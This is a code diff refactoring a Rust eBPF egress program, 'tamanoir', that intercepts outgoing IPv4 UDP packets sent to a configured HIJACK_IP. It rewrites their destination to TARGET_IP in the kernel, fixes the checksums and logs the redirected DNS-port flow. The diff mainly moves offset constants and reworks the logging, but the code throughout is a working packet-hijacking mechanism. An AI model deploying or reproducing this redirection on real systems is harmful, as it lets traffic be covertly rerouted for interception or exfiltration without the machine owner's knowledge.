@@ -10,14 +10,10 @@ use network_types::{
     ip::{IpProto, Ipv4Hdr},
 };
 
-use crate::common::{HIJACK_IP, TARGET_IP};
-
-const IP_OFFSET: usize = EthHdr::LEN;
-const IP_CSUM_OFFSET: usize = IP_OFFSET + 10;
-const IP_DEST_ADDR_OFFSET: usize = IP_OFFSET + 16;
-const UDP_OFFSET: usize = IP_OFFSET + Ipv4Hdr::LEN;
-const UDP_DEST_PORT_OFFSET: usize = UDP_OFFSET + 2;
-const UDP_CSUM_OFFSET: usize = UDP_OFFSET + 6;
+use crate::common::{
+    HIJACK_IP, IP_CSUM_OFFSET, IP_DEST_ADDR_OFFSET, TARGET_IP, UDP_CSUM_OFFSET,
+    UDP_DEST_PORT_OFFSET,
+};
 
 // Maps
 
@@ -31,22 +27,24 @@ pub fn tamanoir_egress(ctx: TcContext) -> i32 {
 
 #[inline]
 fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
-    let target_ip: u32 = TARGET_IP;
-    let hijack_ip: u32 = HIJACK_IP;
-
+    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
+    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
     let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
     if let EtherType::Ipv4 = ethhdr.ether_type {
         let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
         let addr = header.dst_addr;
         if let IpProto::Udp = header.proto {
             if addr == hijack_ip {
-                let target_dns_ipv4_mut = &mut target_ip.to_be() as *mut u32;
+                let target_dns_mut = &mut target_ip.to_be() as *mut u32;
 
                 let skb = &ctx.skb;
 
-                let ip_csum = u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).map_err(|_| ())?);
-                let udp_csum = u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).map_err(|_| ())?);
-                info!(&ctx, "ipcsum: {}  udpcsum: {}", ip_csum, udp_csum);
+                info!(
+                    &ctx,
+                    "ipcsum: {}  udpcsum: {}",
+                    u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
+                    u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
+                );
 
                 // recompute l3 and l4 checksums
                 if let Err(err) = (*skb).l3_csum_replace(
@@ -73,7 +71,7 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
                     bpf_skb_store_bytes(
                         skb.skb,
                         IP_DEST_ADDR_OFFSET as u32,
-                        target_dns_ipv4_mut as *const c_void,
+                        target_dns_mut as *const c_void,
                         4,
                         2,
                     )
@@ -82,23 +80,22 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
                     error!(&ctx, "error writing new address ");
                 }
 
-                let ip_csum = u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).map_err(|_| ())?);
-                let udp_csum = u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).map_err(|_| ())?);
-                info!(&ctx, "ipcsum: {}  udpcsum: {}", ip_csum, udp_csum);
-
-                let ip_offset = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
-                let dst_ip = Ipv4Addr::from_bits(u32::from_be(ip_offset.dst_addr));
-
-                let port_offset = ctx.load::<u16>(UDP_DEST_PORT_OFFSET).map_err(|_| ())?;
-                let dst_port = u16::from_be(port_offset);
+                info!(
+                    &ctx,
+                    "=> ipcsum: {}  udpcsum: {}",
+                    u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
+                    u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
+                );
 
                 info!(
                     &ctx,
                     "{}:{} -> {}:{}",
-                    Ipv4Addr::from_bits(hijack_ip),
+                    Ipv4Addr::from_bits(target_ip),
                     53,
-                    dst_ip,
-                    dst_port
+                    Ipv4Addr::from_bits(u32::from_be(
+                        (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).dst_addr,
+                    )),
+                    u16::from_be(ctx.load::<u16>(UDP_DEST_PORT_OFFSET).unwrap())
                 );
             };
         }
